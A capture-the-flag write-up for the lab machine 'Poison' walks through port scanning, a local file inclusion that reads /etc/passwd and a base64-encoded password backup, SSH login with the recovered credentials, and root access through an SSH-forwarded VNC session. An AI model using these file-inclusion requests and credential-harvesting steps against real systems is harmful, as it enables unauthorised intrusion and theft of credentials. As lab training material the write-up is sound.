# Poison

**Machine ip:** 10.10.10.84

## Enumeration
First thing first, start port scan:
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.84 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -sV -sC -p$ports 10.10.10.84`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/dc6230c3-bc5c-468e-821e-514f8e0828fd)

+ The result shows that 2 TCP ports are open:
```
Port 22: OpenSSH 7.2
Port 80: Apache httpd 2.4.29
```

+ Always start off with enumerating web server first.
+ Navigate to `http://10.10.10.84/`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1c32c4dc-e26f-4728-ba3e-1518b918c928)

+ When entering **listfiles.php** into **Scriptname** textbox, **pwdbackup.txt** is interesting.
+ `http://10.10.10.84/browse.php?file=listfiles.php`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bb8237de-e6cc-41e0-8bef-d003d7e1ae08)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a643911b-431e-4fb0-aea8-fcce9e4e28aa)

+ Enter **pwdbackup.txt** into the textbox, and you'll see base64 encoding.
+ `http://10.10.10.84/browse.php?file=pwdbackup.txt`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/755d1b04-96a4-44ce-936f-87f6ff1d3753)

+ This means that the application is vulnerable to local file inclusion (LFI).

+ And also check whether it is vulnerable to RFI.
+ Navigate to `http://10.10.10.84/browse.php?file=phpinfo.php`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e35caf5f-568a-40da-9480-be78f16123f4)

+ There is no direct RFI as **allow_url_include** is off. Setting allow_url_include to off in your configuration means that your PHP code on your server will not be able to include remote files.

## 1.Method:
+ Let's crack the base64 encoding of **pwdbackup.txt**

+ **Firstly**, crack in bash script [here](https://github.com/h4md153v63n/Bash_Scripts/tree/main/base64-multiple-decoder).

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a60378d4-e4e3-4d17-bd7f-385c8af1a0d9)

+ **Second Alternative**, try this online tool: https://base64-multiple-decode.netlify.app

![image](https://github.com/h4md153v63n/Bash_Scripts/assets/5091265/27a222f4-dc74-4795-ada0-86bda6fae3b6)

+ Get the password of decoded form as `Charix!2#4%6&8(0`
+ Get the users: `http://10.10.10.84/browse.php?file=/etc/passwd`
+ Discovered users: **root**, **toor** and **charix**

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/00e56373-ad34-4087-a00e-7c9efcbf5fae)

+ The user should be `charix`:`Charix!2#4%6&8(0`
+ It belongs to Charix. Login ssh into charix account using the discovered credentials.
+ `ssh charix@10.10.10.84`
+ Get the user shell and user flag.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/bd4b9cf9-8dee-4b01-b130-9f79a2776d93)

## 2.Method:  
+ Find where the log files are located.
```
http://10.10.10.84/browse.php?file=/usr/local/etc/apache24/httpd.conf
```

## Privilege Escalation:
+ Transfer **secret.zip** to your kali attack vm.
+ `scp -P 22 charix@10.10.10.84:/home/charix/secret.zip .` with previous password `Charix!2#4%6&8(0`
+ unzip with the same password `Charix!2#4%6&8(0`: `unzip secret.zip`
+ There's no useful thing!

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/5ec32bc7-b10c-47d6-82ee-cab8ceaf8898)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/a4245b7b-e57c-496c-bf6b-08378b235a83)

+ Lists ports: `netstat -an`
+ 5801 and 5901 are VNC ports for remote desktop access.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/fb6bd861-6308-44b7-b9f7-787ccd94b1d9)

+ List process of vnc: `ps -auwwx | grep vnc`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/87501dde-45a3-4f89-a68a-8618111014a6)

+ Since VNC is a graphical user interface software, we can’t access it through our target machine.
+ We need port forwarding.
+ Run on your kali attack machine with previous password `Charix!2#4%6&8(0`: `ssh -L 7777:127.0.0.1:5901 charix@10.10.10.84`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/7b07e577-d046-4075-9d07-93c93ddf8bff)

+ Verify that the command is working:

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/473a6f5a-8495-474c-b2d1-dcb9984a49cb)

+ Connect to VNC on the attack machine with previous transferred and decompressed **secret** file: `vncviewer 127.0.0.1:7777 -passwd secret`
+ Get the VNC connection with root privileges, and view the root.txt file.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/556d55dc-b294-4080-9030-42426a5bb802)




# References & Alternatives:
+ https://vvmlist.github.io/#poison
+ 
